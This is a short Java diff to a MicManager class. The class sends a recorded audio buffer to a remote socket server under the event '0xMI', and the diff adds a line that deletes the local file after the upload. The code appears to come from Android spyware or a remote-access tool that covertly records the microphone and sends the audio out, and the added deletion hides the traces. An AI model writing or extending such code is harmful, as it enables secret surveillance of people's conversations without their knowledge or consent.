@@ -74,6 +74,7 @@ public  class MicManager {
             object.put("buffer" , data);
             IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
             buf.close();
+            file.delete();
         } catch (FileNotFoundException e) {
             e.printStackTrace();
         } catch (IOException e) {
